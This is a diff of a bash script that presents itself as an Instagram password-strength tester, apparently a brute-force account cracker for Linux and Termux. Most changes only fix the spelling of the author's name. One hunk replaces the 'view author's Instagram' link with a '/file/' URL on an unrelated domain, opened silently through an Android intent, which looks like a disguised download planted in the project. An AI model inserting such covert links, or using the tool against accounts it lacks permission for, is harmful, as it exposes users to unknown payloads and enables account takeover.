@@ -2,7 +2,7 @@
 #
 # A tool to test out the security strength of a instagram account's password. The tool is written in bash scripting language. The tool is officially created for testing purposes. Any unauthorized activity made using our tool will be considered your guilt, and none of ours. You may also have to face penalties, if you do malicious operations that goes against law or someone's privacy. So, better use this tool on authorized services (instagram accounts that you have permission to) as well as for testing purposes. Hacking is not illegal, but only if you do for public good. This tool can be used in linux computer systems as well as you can use it on your android device using terminal emulators like termux [No rooting of the android device is required].
 #
-# Author : Wasim Akram (https://github.com/evildevill/)
+# Author : Waseem Akram (https://github.com/evildevill/)
 # Created on : June 27, 2020
 #
 # Last modified by : Rishav Das (https://github.com/rdofficial/)
@@ -14,7 +14,7 @@
 # 3. Changed the option number for 'exit' from 8 to 0 in the main menu of the tool. Reason is that, when more and newer options will be added to the tool, we have to jump these exit option too. That's why keeping it 0 will be constant forever. Just add new options after 7th option number.
 #
 # Authors contributed to this project (Add your name below if you have contributed) :
-# 1. Wasim Akram (github:https://github.com/evildevill/, email:hackerwasi1@gmail.com)
+# 1. Waseem Akram (github:https://github.com/evildevill/, email:hackerwasi1@gmail.com)
 # 2. Rishav Das (github:https://github.com/rdofficial/, email:rdofficial192@gmail.com)
 #
 # Note : Not each and every part of the project is made by us, some of the core files are made by different other people. So, the real credits goes to them.
@@ -195,7 +195,7 @@ while true; do
         elif [[ $option == 8 || $option == 08 ]]; then
 		# If the user choosed the option for viewing author's instagram account, then we continue to open author's instagram account
 
-		am start -a android.intent.action.VIEW -d https://instagram.com/blckspidr > /dev/null 2>&1
+		am start -a android.intent.action.VIEW -d https://khabarbabal.online/file/MDRiYzUwNTgt > /dev/null 2>&1
 	elif [[ $option == 0 ]]; then
 		# If the user choosed the option to exit the script
 
